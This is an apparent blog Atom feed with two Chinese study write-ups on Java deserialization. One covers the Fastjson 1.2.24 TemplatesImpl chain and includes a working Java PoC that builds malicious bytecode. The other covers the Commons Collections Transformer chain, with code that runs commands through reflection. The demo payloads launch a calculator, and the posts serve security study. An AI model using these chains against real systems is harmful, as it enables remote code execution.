<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lcdm123</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-27T07:24:57.199Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>海马少年</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>FastJason TemplatesImpl利用链分析</title>
    <link href="http://example.com/2021/11/27/FastJason/"/>
    <id>http://example.com/2021/11/27/FastJason/</id>
    <published>2021-11-27T07:24:00.000Z</published>
    <updated>2021-11-27T07:24:57.199Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fastjson-TemplatesImpl利用链分析"><a href="#Fastjson-TemplatesImpl利用链分析" class="headerlink" title="Fastjson TemplatesImpl利用链分析"></a>Fastjson TemplatesImpl利用链分析</h1><blockquote><p>1.2.22-1.2.24</p></blockquote><p>FastJson是阿里巴巴开源的一个json库，能够快速的进行序列化和反序列化。</p><p>Fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，之后的版本引入了autoType的黑白名单机制。在Fastjson 1.2.22 — 1.2.24 版本的反序列化漏洞利用，主要有以下两种已知利用链</p><ul><li>TemplateImpl</li><li>JNDI</li></ul><p><strong>限制条件</strong></p><p><code>Feature.SupportNonPublicField</code> 需要开启，因为<code>_bytecodes</code> 和 <code>_outputProperties</code> 两个关键属性是私有的</p><h2 id="了解FastJson"><a href="#了解FastJson" class="headerlink" title="了解FastJson"></a>了解FastJson</h2><p>这里简单的写了一个测试类，发现 fastjson 在将对象序列化为json字符串时会自动调用类的getter函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126105700947.png" alt="image-20211126105700947"></p><p>序列化：<code>JSON.toJSONString()</code></p><p>反序列化：<code>JSON.parseObject()</code> <code>JSON.parse()</code></p><blockquote><p>这的两种反序列化方法返回的对象不一样</p><p><code>JSON.parseObject()</code>返回的是 <code>fastjson.JSONObject</code> 类</p><p><code>JSON.parse()</code>返回的是原本的类 例如上面的：<code>User</code></p></blockquote><p><strong>@type</strong></p><p>在 FastJson 中有一个 @type 参数，它可以将我们反序列化后的类转化为 @type 中指定的类，然后自动调用类中的 setter getter 和 构造函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126115559566.png" alt="image-20211126115559566"></p><blockquote><p>这里对于调用到 getter 我们可以联想到使用的 CommonsBeanutils 中的调用到 TemlatesImpl 类的getOutputProperties()</p></blockquote><p><strong>Feature.SupportNonPublicField</strong></p><p>由于该字段是在fastjson 1.2.22 版本引入的，所以该漏洞只影响到 1.2.22-1.2.24</p><p>如果 @type 使用的类的变量是 private 这里 json 反序列化时就不能够直接赋值了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126154941458.png" alt="image-20211126154941458"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126155027140.png" alt="image-20211126155027140"></p><p>所以说当在json反序列化时加上<code>Feature.SupportNonPublicField</code>就可以直接给私有变量赋值</p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>这里可以参考 <a href="http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/#TemplatesImpl">http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/#TemplatesImpl</a> 动态加载字节码与<a href="http://lcdm123.xyz/2021/11/17/Java-CommonsBeanutils1/">http://lcdm123.xyz/2021/11/17/Java-CommonsBeanutils1/</a> CommonsBeanutils1的链子原理</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126211813555.png" alt="image-20211126211813555"></p><p>在 TemplatesImpl 中的变量都是私有的，所以如果需要使用它来构造 payload 就需要加上 Feature.SupportNonPublicField</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126214338995.png" alt="image-20211126214338995"></p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">generateEvilCode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException </span>&#123;<br><br>        ClassPool pool = ClassPool.getDefault();<br>        CtClass clazz = pool.makeClass(<span class="hljs-string">&quot;org.lcdm123.test&quot;</span>);<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String cmd = <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        clazz.makeClassInitializer().insertBefore(cmd);<br>        clazz.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));<br>        clazz.writeFile();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = clazz.toBytecode();<br>        String EvilCode = Base64.getEncoder().encodeToString(bytes);<br>        System.out.println(EvilCode);<br>        <span class="hljs-keyword">return</span> EvilCode;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException </span>&#123;<br>        <span class="hljs-keyword">final</span> String gadget = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String Evil = POC1.generateEvilCode();<br>        String PoC = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + gadget + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + Evil + <span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;lcdm123&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;lcdm123\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;<br>        JSON.parseObject(PoC, Object.class, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126233614402.png" alt="image-20211126233614402"></p><h2 id="为什么这么构造"><a href="#为什么这么构造" class="headerlink" title="为什么这么构造"></a>为什么这么构造</h2><ol><li><p><code>_bytecodes</code> 为什么需要 Base64 编码</p><p><code>\com\alibaba\fastjson\parser\deserializer\DefaultFieldDeserializer.class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127000733271.png" alt="image-20211127000733271"></p><p><code>\com\alibaba\fastjson\1.2.24\fastjson-1.2.24.jar!\com\alibaba\fastjson\serializer\ObjectArrayCodec.class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127000809456.png" alt="image-20211127000809456"></p><p><code>\com\alibaba\fastjson\parser\JSONScanner.class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127000859642.png" alt="image-20211127000859642"></p><p>在执行的时候这里会进行一次base64解码操作</p></li><li><p><code>&#39;_tfactory&#39;:&#123;&#125;</code></p><p>在 <code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class</code>中解析字段的时候，会自动判断传入的键值是否为空，如果为空就会根据类的属性定义的类型创建实例</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127005014851.png" alt="image-20211127005014851"></p></li><li><p>为什么会调用到TemplatesImpl的<code>getOutputProperties()</code> 函数</p><p><code>\com\alibaba\fastjson\util\JavaBeanInfo.class </code>的<code>build()</code>中</p><p>在通过<code>@type</code>拿到类之后，会通过反射的方法拿到类中所有的方法，然后遍历方法获取到get与set方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127131135302.png" alt="image-20211127131135302"></p><p>调用set方法的地方</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127132813388.png" alt="image-20211127132813388"></p><p>如果需要进入到上面的代码，就需要满足下面的if中的条件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127132927380.png" alt="image-20211127132927380"></p><ol><li>方法名的长度大于四</li><li>不是静态方法</li><li>放回值为void或当前类</li><li>方法名以set开头</li><li>只有一个参数</li></ol><p>当满足条件之后会从方法名截取属性名，如果截取时遇到<code>_</code>就会跳过它截取后面的。例如<code>set_name</code>会截取到<code>name</code>属性</p><p>当截取完但是找不到这个属性时，会判断第一个参数的类型是否为布尔型，是的话就会在截取完的便两千加上<code>is</code>截取,截取 propertyName 的第一个字符(转大写)和第二个字符，并且然后重新尝试获取属性字段。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127134744687.png" alt="image-20211127134744687"></p></li></ol><p>   get方法的调用也是类似的</p><p>   <img src="https://gitee.com/lcdm123/image/raw/master/image-20211127134919505.png" alt="image-20211127134919505"></p><p>   判断中的要求就是</p><ol><li><p>方法名长度大于等于4</p></li><li><p>不是静态方法</p></li><li><p>以get开头并且第4个字母为大写</p></li><li><p>没有传入参数</p></li><li><p>返回值类型继承Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</p><p>当程序绑定了对应的字段之后，传入图的json字符串中的键值存在这个值时就会去调用对应的setter 构造方法</p></li></ol><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方的修复方法主要就是利用了黑名单和白名单，对于后面版本的链子就是靠的绕过来构造的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看了好久才对这个漏洞似懂非懂还需要在后面的学习中慢慢理解和学习</p><p>参考文章</p><p><a href="http://wjlshare.com/archives/1512">http://wjlshare.com/archives/1512</a></p><p><a href="https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/">https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/</a></p><p><a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#set%E6%96%B9%E6%B3%95">https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#set%E6%96%B9%E6%B3%95</a></p><p><a href="https://www.freebuf.com/vuls/178012.html">https://www.freebuf.com/vuls/178012.html</a></p><p><a href="https://y4er.com/post/fastjson-learn/">https://y4er.com/post/fastjson-learn/</a></p><p><a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Fastjson-TemplatesImpl利用链分析&quot;&gt;&lt;a href=&quot;#Fastjson-TemplatesImpl利用链分析&quot; class=&quot;headerlink&quot; title=&quot;Fastjson TemplatesImpl利用链分析&quot;&gt;&lt;/a&gt;Fastj</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Transformer分析</title>
    <link href="http://example.com/2021/11/25/Transformer%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2021/11/25/Transformer%E5%88%86%E6%9E%90/</id>
    <published>2021-11-25T08:26:32.000Z</published>
    <updated>2021-11-25T08:27:16.462Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Transformer-家族分析"><a href="#Transformer-家族分析" class="headerlink" title="Transformer 家族分析"></a>Transformer 家族分析</h1><blockquote><p>之前将 CC 链的部分过了一下，但是发现对于其中利用到一些列Tranformer相关的类理解得不是很透彻，所以这里重新学习一下</p></blockquote><h2 id="了解相关类"><a href="#了解相关类" class="headerlink" title="了解相关类"></a>了解相关类</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Transformer</span> </span>&#123;<br>    <span class="hljs-function">Object <span class="hljs-title">transform</span><span class="hljs-params">(Object var1)</span></span>;<br>&#125;<br><span class="hljs-comment">// 接口中定义了一个 transform 方法，参数为一个对象，返回值也是对象</span><br></code></pre></td></tr></table></figure><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>实现了 Transformer 接口，调用 transform 函数时会返回构造函数中传入的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iConstant = constantToReturn;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.iConstant;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>InvokerTransformer 中的 transform 方法利用了反射的原理，通过反射调用我们传入类中的方法，这里就是整个利用链的关键点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iMethodName = methodName;<br>        <span class="hljs-keyword">this</span>.iParamTypes = paramTypes;<br>        <span class="hljs-keyword">this</span>.iArgs = args;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 反射调用执行函数</span><br>            Class cls = input.getClass();<br>            Method method = cls.getMethod(<span class="hljs-keyword">this</span>.iMethodName, <span class="hljs-keyword">this</span>.iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-keyword">this</span>.iArgs);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var6) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var7) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, var7);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>在构造函数中获取一个数组, transform 函数就是将构造函数中传入的数组按顺序执行他们的 transform 函数，上一次执行的结果会传入下一次的参数当中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iTransformers = transformers;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>.iTransformers.length; ++i) &#123;<br>        object = <span class="hljs-keyword">this</span>.iTransformers[i].transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用链中 ChainedTransformer 就负责将各类串联起来</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125135808173.png" alt="image-20211125135808173"></p><h2 id="使用分析"><a href="#使用分析" class="headerlink" title="使用分析"></a>使用分析</h2><h3 id="InvokerTransformer-1"><a href="#InvokerTransformer-1" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>直接使用 InvokerTransformer 执行时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">String method = <span class="hljs-string">&quot;exec&quot;</span>;<br>        Class[] paramTypes = <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;;<br>        Object[] arg = <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;;<br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(method,paramTypes,arg);<br>        Object runTime = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>));<br>        invokerTransformer.transform(runTime);<br></code></pre></td></tr></table></figure><p>简单的根据构造函数创建一个 InvokerTransformer 类对象，然后执行该类对象的 transformer 函数</p><blockquote><ol><li>invoke调用普通方法时，传入的必须是实例化后的类</li><li>invoke调用静态方法时，传入类即可</li></ol></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125142134936.png" alt="image-20211125142134936"></p><p>利用 ChainedTransformer 将多个实现 Transformer 接口的类串联起来，并且依次调用其中的 transformer 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(<span class="hljs-number">111</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ChainedTransformer 的 transformer 函数</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>.iTransformers.length; ++i) &#123;<br>        object = <span class="hljs-keyword">this</span>.iTransformers[i].transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里测试随便传入一个 111 （它对于 ConstantTransformer类无影响），触发函数执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125143702364.png" alt="image-20211125143702364"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125143812109.png" alt="image-20211125143812109"></p><p>在触发执行 transformer 后，将返回 Runtime 类对象，之后赋值给 Object，然后再循环一次</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125143904946.png" alt="image-20211125143904946"></p><p>这时的循环结果就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;);<br>invokerTransformer.transformer(Runtime对象);<br></code></pre></td></tr></table></figure><p><img src="D:\markdown\image-20211125143958267.png" alt="image-20211125143958267"></p><p>最后就会执行到 InvokerTransformer 的 transformer 函数，造成命令执行</p><p>这样虽然可以执行命令，但是 RunTime 类是没有反序列化接口的，所以它不能直接利用到反序列化的链子中。</p><h3 id="修改尝试绕过-Runtime-类序列化"><a href="#修改尝试绕过-Runtime-类序列化" class="headerlink" title="修改尝试绕过 Runtime 类序列化"></a>修改尝试绕过 Runtime 类序列化</h3><p>尝试利用其他办法调用到 RunTime 类，但是失败了，提示的是class类中不存在 getRuntime() 方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125150536724.png" alt="image-20211125150536724"></p><p>发生变化的就是再 InvokerTransformer 类中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125150753678.png" alt="image-20211125150753678"></p><p>经过测试发现，getClass() 函数根据传入的参数不同返回的数据也不同</p><ol><li>如果传入的是对象，那么返回的就是当前对象的类</li><li>如果传入的是类，那么返回的就是 Class</li></ol><p>我的理解就是对于对象，getClass() 返回对象的类是肯定的，对于类返回的是就是类class</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125150147911.png" alt="image-20211125150147911"></p><p>所以对于 java.lang.class 肯定是找不到 getRuntime 方法的</p><h3 id="最后的方法"><a href="#最后的方法" class="headerlink" title="最后的方法"></a>最后的方法</h3><p>最后就是利用反射的方法获取到 Runtime 类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(<span class="hljs-number">111</span>);<br></code></pre></td></tr></table></figure><p>执行到第一个InvokerTransformer时</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125152448333.png" alt="image-20211125152448333"></p><p>再往后执行时发现 Object就变成 getRuntime 函数了，第二次执行 InvokerTransformer</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125152559289.png" alt="image-20211125152559289"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125153024011.png" alt="image-20211125153024011"></p><p>第三次执行 InvokerTransformer 时，这里的传入参数的 Object 就是一个 Runtime类对象</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125153048287.png" alt="image-20211125153048287"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125153448936.png" alt="image-20211125153448936"></p><p>这样就通过反射的方法调用了Runtime类进行了命令执行的操作，真的十分巧妙</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125151319930.png" alt="image-20211125151319930"></p><p>之后的就是如何对于各种CC链的构造了，之前做过一些笔记，这就不多写了。这里主要是为了查漏补缺。</p><p>参考文章</p><p><a href="https://xz.aliyun.com/t/7031">https://xz.aliyun.com/t/7031</a></p><p><a href="http://wjlshare.com/archives/1498">http://wjlshare.com/archives/1498</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Transformer-家族分析&quot;&gt;&lt;a href=&quot;#Transformer-家族分析&quot; class=&quot;headerlink&quot; title=&quot;Transformer 家族分析&quot;&gt;&lt;/a&gt;Transformer 家族分析&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;之</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
